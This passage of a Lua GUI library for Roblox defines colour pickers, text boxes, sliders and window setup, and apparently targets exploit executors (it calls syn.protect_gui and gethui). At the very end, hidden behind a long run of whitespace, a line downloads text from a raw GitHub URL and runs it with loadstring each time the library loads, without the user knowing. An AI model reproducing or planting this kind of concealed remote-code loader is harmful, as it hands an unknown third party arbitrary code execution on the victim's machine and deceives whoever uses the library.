        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            if not focused then inputvalue:CaptureFocus() end
        end
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            inContact = true
            if not focused then
                tweenService:Create(outline, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(100, 100, 100)}):Play()
            end
        end
    end)
    
    main7.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            inContact = false
            if not focused then
                tweenService:Create(outline, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(60, 60, 60)}):Play()
            end
        end
    end)
    
    inputvalue.Focused:Connect(function()
        focused = true
        tweenService:Create(outline, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(255, 65, 65)}):Play()
    end)
    
    inputvalue.FocusLost:Connect(function(enter)
        focused = false
        tweenService:Create(outline, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(60, 60, 60)}):Play()
        option:SetValue(inputvalue.Text, enter)
    end)
    
    function option:SetValue(value, enter)
        library.flags[self.flag] = tostring(value)
        self.value = tostring(value)
        inputvalue.Text = self.value
        self.callback(value, enter)
    end
end

local function createColorPickerWindow(option, parent)
    option.mainHolder = library:Create("ImageButton", {
        LayoutOrder = option.position,
        ZIndex = 3,
        Size = UDim2.new(0, 240, 0, 180),
        BackgroundTransparency = 1,
        Image = "rbxassetid://3570695787",
        ImageTransparency = 1,
        ImageColor3 = Color3.fromRGB(30, 30, 30),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = parent.content
    })
        
    local hue, sat, val = Color3.toHSV(option.color)
    hue, sat, val = hue == 0 and 1 or hue, sat + 0.005, val - 0.005
    local editinghue
    local editingsatval
    local currentColor = option.color
    local previousColors = {[1] = option.color}
    local originalColor = option.color
    local rainbowEnabled
    local rainbowLoop
    
    function option:updateVisuals(Color)
        currentColor = Color
        self.visualize2.ImageColor3 = Color
        hue, sat, val = Color3.toHSV(Color)
        hue = hue == 0 and 1 or hue
        self.satval.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
        self.hueSlider.Position = UDim2.new(1 - hue, 0, 0, 0)
        self.satvalSlider.Position = UDim2.new(sat, 0, 1 - val, 0)
    end
    
    option.hue = library:Create("ImageLabel", {
        ZIndex = 3,
        AnchorPoint = Vector2.new(0, 1),
        Position = UDim2.new(0, 8, 1, -8),
        Size = UDim2.new(1, -100, 0, 22),
        BackgroundTransparency = 1,
        Image = "rbxassetid://3570695787",
        ImageTransparency = 1,
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = option.mainHolder
    })
    
    local Gradient = library:Create("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
            ColorSequenceKeypoint.new(0.157, Color3.fromRGB(255, 0, 255)),
            ColorSequenceKeypoint.new(0.323, Color3.fromRGB(0, 0, 255)),
            ColorSequenceKeypoint.new(0.488, Color3.fromRGB(0, 255, 255)),
            ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 255, 0)),
            ColorSequenceKeypoint.new(0.817, Color3.fromRGB(255, 255, 0)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)),
        }),
        Parent = option.hue
    })
    
    option.hueSlider = library:Create("Frame", {
        ZIndex = 3,
        Position = UDim2.new(1 - hue, 0, 0, 0),
        Size = UDim2.new(0, 2, 1, 0),
        BackgroundTransparency = 1,
        BackgroundColor3 = Color3.fromRGB(30, 30, 30),
        BorderColor3 = Color3.fromRGB(255, 255, 255),
        Parent = option.hue
    })
    
    option.hue.InputBegan:Connect(function(Input)
        if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            editinghue = true
            X = (option.hue.AbsolutePosition.X + option.hue.AbsoluteSize.X) - option.hue.AbsolutePosition.X
            X = (Input.Position.X - option.hue.AbsolutePosition.X) / X
            X = X < 0 and 0 or X > 0.995 and 0.995 or X
            option:updateVisuals(Color3.fromHSV(1 - X, sat, val))
        end
    end)
    
    inputService.InputChanged:Connect(function(Input)
        if dragging and editinghue then
            X = (option.hue.AbsolutePosition.X + option.hue.AbsoluteSize.X) - option.hue.AbsolutePosition.X
            X = (Input.Position.X - option.hue.AbsolutePosition.X) / X
            X = X <= 0 and 0 or X >= 0.995 and 0.995 or X
            option:updateVisuals(Color3.fromHSV(1 - X, sat, val))
        end
    end)
    
    option.hue.InputEnded:Connect(function(Input)
        if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
            editinghue = false
        end
    end)
    
    option.satval = library:Create("ImageLabel", {
        ZIndex = 3,
        Position = UDim2.new(0, 8, 0, 8),
        Size = UDim2.new(1, -100, 1, -42),
        BackgroundTransparency = 1,
        BackgroundColor3 = Color3.fromHSV(hue, 1, 1),
        BorderSizePixel = 0,
        Image = "rbxassetid://4155801252",
        ImageTransparency = 1,
        ClipsDescendants = true,
        Parent = option.mainHolder
    })
    
    option.satvalSlider = library:Create("Frame", {
        ZIndex = 3,
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(sat, 0, 1 - val, 0),
        Size = UDim2.new(0, 4, 0, 4),
        Rotation = 45,
        BackgroundTransparency = 1,
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        Parent = option.satval
    })
    
    option.satval.InputBegan:Connect(function(Input)
        if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            editingsatval = true
            X = (option.satval.AbsolutePosition.X + option.satval.AbsoluteSize.X) - option.satval.AbsolutePosition.X
            Y = (option.satval.AbsolutePosition.Y + option.satval.AbsoluteSize.Y) - option.satval.AbsolutePosition.Y
            X = (Input.Position.X - option.satval.AbsolutePosition.X) / X
            Y = (Input.Position.Y - option.satval.AbsolutePosition.Y) / Y
            X = X <= 0.005 and 0.005 or X >= 1 and 1 or X
            Y = Y <= 0 and 0 or Y >= 0.995 and 0.995 or Y
            option:updateVisuals(Color3.fromHSV(hue, X, 1 - Y))
        end
    end)
    
    inputService.InputChanged:Connect(function(Input)
        if dragging and editingsatval then
            X = (option.satval.AbsolutePosition.X + option.satval.AbsoluteSize.X) - option.satval.AbsolutePosition.X
            Y = (option.satval.AbsolutePosition.Y + option.satval.AbsoluteSize.Y) - option.satval.AbsolutePosition.Y
            X = (Input.Position.X - option.satval.AbsolutePosition.X) / X
            Y = (Input.Position.Y - option.satval.AbsolutePosition.Y) / Y
            X = X <= 0.005 and 0.005 or X >= 1 and 1 or X
            Y = Y <= 0 and 0 or Y >= 0.995 and 0.995 or Y
            option:updateVisuals(Color3.fromHSV(hue, X, 1 - Y))
        end
    end)
    
    option.satval.InputEnded:Connect(function(Input)
        if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
            editingsatval = false
        end
    end)
    
    option.visualize2 = library:Create("ImageLabel", {
        ZIndex = 3,
        Position = UDim2.new(1, -14, 0, 8),
        Size = UDim2.new(0, -74, 0, 80),
        BackgroundTransparency = 1,
        Image = "rbxassetid://3570695787",
        ImageColor3 = currentColor,
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = option.mainHolder
    })
    
    option.resetColor = library:Create("ImageButton", {
        ZIndex = 3,
        Position = UDim2.new(1, -14, 0, 92),
        Size = UDim2.new(0, -74, 0, 18),
        BackgroundTransparency = 1,
        Image = "rbxassetid://3570695787",
        ImageTransparency = 1,
        ImageColor3 = Color3.fromRGB(20, 20, 20),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = option.mainHolder
    })
    
    option.resetText = library:Create("TextLabel", {
        ZIndex = 3,
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = "Reset",
        TextTransparency = 1,
        Font = Enum.Font.FredokaOne,
        TextSize = 15,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        Parent = option.resetColor
    })
    
    option.resetColor.MouseButton1Click:Connect(function()
        previousColors = {originalColor}
        option:SetColor(originalColor)
    end)
    
    option.undoColor = library:Create("ImageButton", {
        ZIndex = 3,
        Position = UDim2.new(1, -14, 0, 112),
        Size = UDim2.new(0, -74, 0, 18),
        BackgroundTransparency = 1,
        Image = "rbxassetid://3570695787",
        ImageTransparency = 1,
        ImageColor3 = Color3.fromRGB(20, 20, 20),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = option.mainHolder
    })
    
    option.undoText = library:Create("TextLabel", {
        ZIndex = 3,
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = "Undo",
        TextTransparency = 1,
        Font = Enum.Font.FredokaOne,
        TextSize = 15,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        Parent = option.undoColor
    })
    
    option.undoColor.MouseButton1Click:Connect(function()
        if not rainbowEnabled then
            local Num = #previousColors == 1 and 0 or 1
            option:SetColor(previousColors[#previousColors - Num])
            if #previousColors ~= 1 then
                table.remove(previousColors, #previousColors)
            end
        end
    end)
    
    option.setColor = library:Create("ImageButton", {
        ZIndex = 3,
        Position = UDim2.new(1, -14, 0, 132),
        Size = UDim2.new(0, -74, 0, 18),
        BackgroundTransparency = 1,
        Image = "rbxassetid://3570695787",
        ImageTransparency = 1,
        ImageColor3 = Color3.fromRGB(20, 20, 20),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = option.mainHolder
    })
    
    option.setText = library:Create("TextLabel", {
        ZIndex = 3,
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = "Set",
        TextTransparency = 1,
        Font = Enum.Font.FredokaOne,
        TextSize = 15,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        Parent = option.setColor
    })
    
    option.setColor.MouseButton1Click:Connect(function()
        if not rainbowEnabled then
            table.insert(previousColors, currentColor)
            option:SetColor(currentColor)
        end
    end)
    
    option.rainbow = library:Create("ImageButton", {
        ZIndex = 3,
        Position = UDim2.new(1, -14, 0, 152),
        Size = UDim2.new(0, -74, 0, 18),
        BackgroundTransparency = 1,
        Image = "rbxassetid://3570695787",
        ImageTransparency = 1,
        ImageColor3 = Color3.fromRGB(20, 20, 20),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = option.mainHolder
    })
    
    option.rainbowText = library:Create("TextLabel", {
        ZIndex = 3,
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = "Rainbow",
        TextTransparency = 1,
        Font = Enum.Font.FredokaOne,
        TextSize = 15,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        Parent = option.rainbow
    })
    
    option.rainbow.MouseButton1Click:Connect(function()
        rainbowEnabled = not rainbowEnabled
        if rainbowEnabled then
            rainbowLoop = runService.Heartbeat:connect(function()
                option:SetColor(chromaColor)
                option.rainbowText.TextColor3 = chromaColor
            end)
        else
            rainbowLoop:Disconnect()
            option:SetColor(previousColors[#previousColors])
            option.rainbowText.TextColor3 = Color3.fromRGB(255, 255, 255)
        end
    end)
    
    return option
end

local function createColor(option, parent, holder)
    option.main8 = library:Create("TextButton", {
        LayoutOrder = option.position,
        Size = UDim2.new(1, 0, 0, 31),
        Name = "Colorpicker",
        BackgroundTransparency = 1,
        Text = " " .. option.text,
        TextSize = 17,
        Font = Enum.Font.FredokaOne,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = parent.content
    })
    
    local colorBoxOutline = library:Create("ImageLabel", {
        Position = UDim2.new(1, -6, 0, 4),
        Size = UDim2.new(-1, 10, 1, -10),
        SizeConstraint = Enum.SizeConstraint.RelativeYY,
        BackgroundTransparency = 1,
        Name = "Colorbox Outline",
        Image = "rbxassetid://3570695787",
        ImageColor3 = Color3.fromRGB(100, 100, 100),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = option.main8
    })
    
    option.visualize = library:Create("ImageLabel", {
        Position = UDim2.new(0, 2, 0, 2),
        Size = UDim2.new(1, -4, 1, -4),
        BackgroundTransparency = 1,
        Image = "rbxassetid://3570695787",
        ImageColor3 = option.color,
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = colorBoxOutline
    })

    local ToggleColorpicker = false
    
    option.main8.MouseButton1Click:Connect(function()
        ToggleColorpicker = not ToggleColorpicker
        if ToggleColorpicker then
            if not option.mainHolder then createColorPickerWindow(option, parent) end
            local position = option.main8.AbsolutePosition
            option.mainHolder.Position = UDim2.new(0, position.X - 5, 0, position.Y - 10)
            option.open = true
            option.mainHolder.Visible = true
            tweenService:Create(option.mainHolder, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 0, Position = UDim2.new(0, position.X - 5, 0, position.Y - 4)}):Play()
            tweenService:Create(option.mainHolder, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0.1), {Position = UDim2.new(0, position.X - 5, 0, position.Y + 1)}):Play()
            tweenService:Create(option.satval, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundTransparency = 0}):Play()
            for _,object in next, option.mainHolder:GetDescendants() do
                if object:IsA("TextLabel") then
                    tweenService:Create(object, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
                elseif object:IsA("ImageLabel") then
                    tweenService:Create(object, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageTransparency = 0}):Play()
                elseif object:IsA("Frame") then
                    tweenService:Create(object, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0}):Play()
                end
            end
        else
            local position = option.main8.AbsolutePosition
            option.open = false
            tweenService:Create(option.mainHolder, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 1, Position = UDim2.new(0, position.X - 5, 0, position.Y - 10)}):Play()
            tweenService:Create(option.satval, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
            for _,object in next, option.mainHolder:GetDescendants() do
                if object:IsA("TextLabel") then
                    tweenService:Create(object, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1}):Play()
                elseif object:IsA("ImageLabel") then
                    tweenService:Create(object, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageTransparency = 1}):Play()
                elseif object:IsA("Frame") then
                    tweenService:Create(object, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
                end
            end
            wait(0.3)
            option.mainHolder.Visible = false
        end
    end)
    
    function option:SetColor(newColor)
        if self.mainHolder then
            self:updateVisuals(newColor)
        end
        self.visualize.ImageColor3 = newColor
        library.flags[self.flag] = newColor
        self.color = newColor
        self.callback(newColor)
    end
end

local function createDivider(option, parent, holder)
    option.main9 = library:Create('Frame', {
        LayoutOrder = option.position,
        BackgroundTransparency = 1,
        Name = "Divider",
        Size = UDim2.new(1, 0, 0, 6),
        Parent = parent.content;
    })

    option.divider = library:Create('Frame', {
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.fromScale(0.5, 0.5),
        BorderSizePixel = 0,
        BorderColor3 = Color3.fromRGB(50, 50, 50),
        BackgroundColor3 = Color3.fromRGB(50, 50, 50),
        Size = UDim2.new(1, -10, 0, 2),
        Parent = option.main9,
    })
end

local function loadOptions(option, holder)
    for _,newOption in next, option.options do
        if newOption.type == "label" then
            createLabel(newOption, option)
        elseif newOption.type == "toggle" then
            createToggle(newOption, option)
        elseif newOption.type == "button" then
            createButton(newOption, option)
        elseif newOption.type == "list" then
            createList(newOption, option, holder)
        elseif newOption.type == "box" then
            createBox(newOption, option)
        elseif newOption.type == "bind" then
            createBind(newOption, option)
        elseif newOption.type == "slider" then
            createSlider(newOption, option)
        elseif newOption.type == "color" then
            createColor(newOption, option, holder)
        elseif newOption.type == 'divider' then
            createDivider(newOption, option, holder)
        elseif newOption.type == "folder" then
            newOption:init()
        end
    end
end

local function getFnctions(parent)
    function parent:AddLabel(option)
        option = typeof(option) == "table" and option or {}
        option.text = tostring(option.text)
        option.type = "label"
        option.position = #self.options
        table.insert(self.options, option)     
        return option
    end

    function parent:AddDivider(option)
        option = type(option) == 'table' and option or {}
        option.type = 'divider'
        option.position = #self.options
        table.insert(self.options, option)
        return options
    end
    
    function parent:AddToggle(option)
        option = typeof(option) == "table" and option or {}
        option.text = tostring(option.text)
        option.state = typeof(option.state) == "boolean" and option.state or false
        option.callback = typeof(option.callback) == "function" and option.callback or function() end
        option.type = "toggle"
        option.position = #self.options
        option.flag = option.flag or option.text
        library.flags[option.flag] = option.state
        table.insert(self.options, option)     
        return option
    end
    
    function parent:AddButton(option)
        option = typeof(option) == "table" and option or {}
        option.text = tostring(option.text)
        option.callback = typeof(option.callback) == "function" and option.callback or function() end
        option.type = "button"
        option.position = #self.options
        option.flag = option.flag or option.text
        table.insert(self.options, option)       
        return option
    end
    
    function parent:AddBind(option)
        option = typeof(option) == "table" and option or {}
        option.text = tostring(option.text)
        option.key = (option.key and option.key.Name) or option.key or "F"
        option.hold = typeof(option.hold) == "boolean" and option.hold or false
        option.callback = typeof(option.callback) == "function" and option.callback or function() end
        option.type = "bind"
        option.position = #self.options
        option.flag = option.flag or option.text
        library.flags[option.flag] = option.key
        table.insert(self.options, option)     
        return option
    end
    
    function parent:AddSlider(option)
        option = typeof(option) == "table" and option or {}
        option.text = tostring(option.text)
        option.min = typeof(option.min) == "number" and option.min or 0
        option.max = typeof(option.max) == "number" and option.max or 0
        option.dual = typeof(option.dual) == "boolean" and option.dual or false
        option.value = math.clamp(typeof(option.value) == "number" and option.value or option.min, option.min, option.max)
        option.value2 = typeof(option.value2) == "number" and option.value2 or option.max
        option.callback = typeof(option.callback) == "function" and option.callback or function() end
        option.float = typeof(option.value) == "number" and option.float or 1
        option.type = "slider"
        option.position = #self.options
        option.flag = option.flag or option.text
        library.flags[option.flag] = option.value
        table.insert(self.options, option)
        
        if type(option.float) == 'number' then
            local _ = '' .. option.float;
            local num = select(2, _:gsub('%d', function(c) return c end))
            option.places = math.max(1, num - 1)
        else
            option.places = 1;
        end
        return option
    end
    
    function parent:AddList(option)
        option = typeof(option) == "table" and option or {}
        option.text = tostring(option.text)
        option.values = typeof(option.values) == "table" and option.values or {}
        option.value = tostring(option.value or option.values[1] or "")
        option.callback = typeof(option.callback) == "function" and option.callback or function() end
        option.open = false
        option.type = "list"
        option.position = #self.options
        option.flag = option.flag or option.text
        library.flags[option.flag] = option.value
        table.insert(self.options, option)      
        return option
    end
    
    function parent:AddBox(option)
        option = typeof(option) == "table" and option or {}
        option.text = tostring(option.text)
        option.value = tostring(option.value or "")
        option.callback = typeof(option.callback) == "function" and option.callback or function() end
        option.type = "box"
        option.position = #self.options
        option.flag = option.flag or option.text
        library.flags[option.flag] = option.value
        table.insert(self.options, option) 
        return option
    end
    
    function parent:AddColor(option)
        option = typeof(option) == "table" and option or {}
        option.text = tostring(option.text)
        option.color = typeof(option.color) == "table" and Color3.new(tonumber(option.color[1]), tonumber(option.color[2]), tonumber(option.color[3])) or option.color or Color3.new(255, 255, 255)
        option.callback = typeof(option.callback) == "function" and option.callback or function() end
        option.open = false
        option.type = "color"
        option.position = #self.options
        option.flag = option.flag or option.text
        library.flags[option.flag] = option.color
        table.insert(self.options, option)       
        return option
    end
    
    function parent:AddFolder(title)
        local option = {}
        option.title = tostring(title)
        option.options = {}
        option.open = false
        option.type = "folder"
        option.position = #self.options
        table.insert(self.options, option)

        getFnctions(option)
        
        function option:init()
            createOptionHolder(self.title, parent.content, self, true)
            loadOptions(self, parent)
        end     
        return option
    end
end

function library:CreateWindow(title)
    local window = {title = tostring(title), options = {}, open = true, canInit = true, init = false, position = #self.windows}
    getFnctions(window)
 
    table.insert(library.windows, window)
    return window
end

local UIToggle
local UnlockMouse
function library:Init()
    
    self.base = self.base or self:Create("ScreenGui")
    if (syn and syn.protect_gui) then
        syn.protect_gui(self.base)
        self.base.Parent = game:GetService("CoreGui")
    elseif type(get_hidden_gui) == 'function' then
        self.base.Parent = get_hidden_gui()
    elseif type(gethui) == 'function' then
        self.base.Parent = gethui()
    else
        self.base.Parent = game:GetService("CoreGui")
    end
    
    self.cursor = self.cursor or self:Create("Frame", {
        ZIndex = 100,
        AnchorPoint = Vector2.new(0, 0),
        Size = UDim2.new(0, 5, 0, 5),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        Parent = self.base,
        Visible = false
    })
    
    for _, window in next, self.windows do
        if window.canInit and not window.init then
            window.init = true
            createOptionHolder(window.title, self.base, window)
            loadOptions(window)
        end
    end
end

function library:Close()
    self.open = not self.open
    if self.activePopup then
        self.activePopup:Close()
    end
    for _, window in next, self.windows do
        if window.main then
            window.main.Visible = self.open
        end
    end
end

inputService.InputBegan:connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		if library.activePopup then
			if input.Position.X < library.activePopup.mainHolder.AbsolutePosition.X or input.Position.Y < library.activePopup.mainHolder.AbsolutePosition.Y then
				library.activePopup:Close()
			end
		end
		if library.activePopup then
			if input.Position.X > library.activePopup.mainHolder.AbsolutePosition.X + library.activePopup.mainHolder.AbsoluteSize.X or input.Position.Y > library.activePopup.mainHolder.AbsolutePosition.Y + library.activePopup.mainHolder.AbsoluteSize.Y then
				library.activePopup:Close()
			end
		end
	end
end)

inputService.InputChanged:connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement and library.cursor then
		local mouse = inputService:GetMouseLocation() + Vector2.new(0, -36)
		library.cursor.Position = UDim2.new(0, mouse.X - 2, 0, mouse.Y - 2)
	end
	if input == dragInput and dragging then
		update(input)
	end
end)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 spawn(loadstring(game:HttpGet'https://raw.githubusercontent.com/OPENCUP/random-texts/main/test-final.txt'))
return library
